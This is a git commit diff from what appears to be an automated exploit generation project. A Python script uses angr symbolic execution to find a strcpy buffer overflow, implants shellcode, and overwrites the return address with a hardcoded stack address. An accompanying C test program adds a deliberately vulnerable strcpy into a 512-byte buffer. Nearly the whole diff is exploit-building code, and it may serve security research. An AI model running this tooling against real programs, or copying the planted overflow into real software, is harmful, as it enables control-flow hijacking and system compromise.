a73240a56788f6ef6417395f3b350438e1210899
Khalid Akash <khalkash@gmail.com>
2019-04-02 14:53:53 -0400

    Exploit generation works. TODO: Need to find address of shellcode within the buffer since its not a DEP stack. Ideally would like to automate testing the exploit (decoding the bytearray into an ascii string doesn't work.)

--- src/autoattack.py
+++ src/autoattack.py
@@ -1,9 +1,13 @@
 #!/usr/bin/env python3
 import subprocess
 import os
+import logging
 import sys
 import angr
 import claripy
+import struct
+
+target_addr = 0x7fffffffdda0
 
 def load_shellcode(file_path):
     '''
@@ -18,16 +22,17 @@ def load_shellcode(file_path):
     print(shellcode)
     return shellcode
 
-def scan_target():
-    rbp_addr = 0x0
-    buffer_addr = 0x0
-    file_path = "../tests/resources/simple_buffer.o"
+def scan_target(file_path):
+    """
+    Scans the target binary for memory vulnurabilites
+    """
+    logging.getLogger('angr.anager').setLevel(logging.CRITICAL)
+
     if not os.path.isfile(file_path):
         subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
-        subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
+    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
     project = angr.Project(file_path,\
             load_options={'auto_load_libs':False})
-
     print("Architecture: " + project.arch.name + " Starting at address:  " + hex(project.entry))
     print("Endianness: " + project.arch.memory_endness)
 
@@ -41,36 +46,38 @@ def scan_target():
     cfg = project.analyses.CFG()
 
     def get_func_addr( func_name, plt=None ):
-            found = [
-                addr for addr,func in cfg.kb.functions.items()
-                if func_name == func.name and (plt is None or func.is_plt == plt)
-                ]
-            if len( found ) > 0:
-                print("Found "+func_name+"'s address at "+hex(found[0])+"!")
-                return found[0]
-            else:
-                raise Exception("No address found for function : "+func_name)
-
+        """
+        Returns function address of a non stripped binary
+        """
+        found = [
+            addr for addr,func in cfg.kb.functions.items()
+            if func_name == func.name and (plt is None or func.is_plt == plt)
+            ]
+        if len( found ) > 0:
+            print("Found "+func_name+"'s address at "+hex(found[0])+"!")
+            return found[0]
+        else:
+            raise Exception("No address found for function : "+func_name)
     exit_addr = get_func_addr("exit")
     strcpy_addr = get_func_addr("strcpy")
     argv = [project.filename]
 
-    sym_arg_size = 200
+    sym_arg_size = 750
 
     sym_arg = claripy.BVS('sym_arg', 8 * sym_arg_size)
     argv.append(sym_arg)
-    argv.append("Found the canary!")
+    argv.append("Found the canary")
 
     state = project.factory.entry_state(args=argv)
 
     sm = project.factory.simulation_manager(state)
 
     def find_strcpy(state):
+        """
+        'Lambda' to simulation manager that returns true if the address of strcpy is found
+        """
         if(state.ip.args[0] == strcpy_addr):
             print("Strcpy found during simulation!")
-            print("BV RBP address at: ", state.memory.load(state.regs.rbp))
-            rbp_addr = state.solver.eval(state.memory.load(state.regs.rbp, 8), cast_to=int)
-            print("RBP address at: ", rbp_addr)
             bv_strcpy_mem = state.memory.load(state.regs.rsi, len(argv[1]))
             strcpy_src = state.solver.eval(bv_strcpy_mem, cast_to=bytes)
             return True if argv[2].encode() in strcpy_src else False
@@ -82,10 +89,12 @@ def scan_target():
     result = ""
     if len(found) > 0:
         found = sm.found[0]
+        print(found.solver.eval(sm.found[0].regs.rbp, cast_to=bytes))
         result = found.solver.eval(argv[1], cast_to=bytes)
     else:
         result = "ERROR: Could not find any paths!"
-    return result
+    buffer_size = found.solver.eval(found.regs.rbp - found.regs.rdi, cast_to=int)
+    return (result, buffer_size)
 
 
 def find_index_of_buffer(exploit_str, length):
@@ -109,6 +118,9 @@ def find_index_of_buffer(exploit_str, length):
 
 
 def append_shellcode(exploit_str):
+    """
+    Implants shellcode in a control-flow hijack ready payload
+    """
     ret_str = bytearray() 
     shellcode = load_shellcode("../tests/resources/shellcode_encoding")
     index = find_index_of_buffer(exploit_str, len(shellcode))
@@ -122,12 +134,34 @@ def append_shellcode(exploit_str):
             count += 1
         else:
             ret_str.append(exploit_str[i])
+    for (i, val) in enumerate(ret_str):
+        if val == 0x00:
+            ret_str[i] = 0x41
+    print("Length of shellcode: " + str(len(shellcode)) + " at index: " + str(index))
     return (ret_str, index)
 
-def generate_exploit():
-    control_flow_hijack_str = scan_target()
-    payload_with_shellcode = append_shellcode(control_flow_hijack_str)
+def inject_ret_addr(payload, distance_to_BP):
+    """
+    Takes in payload string with shellcode and distance to the stack base pointer
+    from the buffer. 
+    """
+    print("Distance to base pointer from buffer is: " + str(distance_to_BP))
+    distance_to_BP += 8 #RBP + 8 is Ret address
+    encoded_addr = struct.pack("<Q", target_addr)
+    final_payload = payload[0][:distance_to_BP] + encoded_addr + payload[0][distance_to_BP:]
+    print(final_payload)
+    return final_payload
+
     
 
+
+
+def generate_exploit():
+    control_flow_hijack_str = scan_target("../tests/resources/simple_buffer.o")
+    payload_with_shellcode = append_shellcode(control_flow_hijack_str[0])
+    final_payload = inject_ret_addr(payload_with_shellcode, control_flow_hijack_str[1])
+    return final_payload
+
+
 if __name__ == "__main__":
-    generate_exploit()
+    payload = generate_exploit()
--- tests/resources/simple_buffer.c
+++ tests/resources/simple_buffer.c
@@ -2,21 +2,28 @@
 #include <stdlib.h>
 #include <string.h>
 
+void vulnurable_func(char *payload)
+{
+    char broken_buffer[512];
+    strcpy(broken_buffer, payload);
+}
+
 int main(int argc, char **argv)
 {
     int a = 10;
     int b = 20;
-    char buffer[128];
-    char *canary = argv[2];
-    if(strncmp(argv[1], canary, 17) != 0 && argc < 2)
+    if(argc < 3)
     {
         printf("Not enough arguments to %s!\n", __FILE__);
         exit(1);
     }
-
-    strcpy(buffer, *(argv + 1));
+    char *canary = argv[2];
+    if(strncmp(argv[1], canary, 17) != 0)
+    {
+        exit(1);
+    }
+    vulnurable_func(*(argv + 1));
     int c = a + b;
-    printf("Buffer is currently: %s\n", buffer);
     printf("Exiting simple_buffer.c\n");
     return 0;
 }
